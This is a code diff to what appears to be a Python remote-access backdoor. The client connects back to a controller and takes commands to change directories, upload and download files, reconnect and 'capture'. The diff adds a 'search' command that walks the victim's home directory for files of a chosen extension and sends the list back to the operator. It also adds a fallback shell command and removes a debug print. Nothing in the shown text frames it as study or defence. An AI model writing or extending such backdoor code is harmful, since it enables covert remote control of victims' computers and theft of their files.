@@ -140,6 +140,8 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         try:
             os.chdir(dirr)
             self.r_send(self.exec_cmd("cd"))
+        except AttributeError:
+            self.r_send(self.exec_cmd("pwd"))
         except Exception as e:
             self.r_send(str(e))
         
@@ -168,6 +170,16 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                 break
             f.write(packet)
 
+    def search(self, ext):
+        home = os.path.expanduser("~")
+        res = ""
+        for root, dirs, files in os.walk(home):
+            for file in files:
+                if file.endswith(ext):
+                    res += os.path.join(root, file) + '\n'
+        self.r_send(res)
+
+
     def run(self):
         while(True):
             try:
@@ -176,7 +188,6 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                 if cmd[0] == "cd" and len(cmd)>1:
                     self.change_dir(cmd[1])
                 elif cmd[0] == "download":
-                    print("in download")
                     self.upload(cmd[1])
                 elif cmd[0] == "upload":
                     self.download(cmd[1])
@@ -184,6 +195,8 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                     self.connect(self.IP, self.PORT)
                 elif cmd[0] == "clear":
                     self.run()
+                elif cmd[0] == "search" and len(cmd)>1:
+                    self.search(cmd[1])
 
                 elif cmd[0] == "capture":
                     current_dir = os.getcwd()
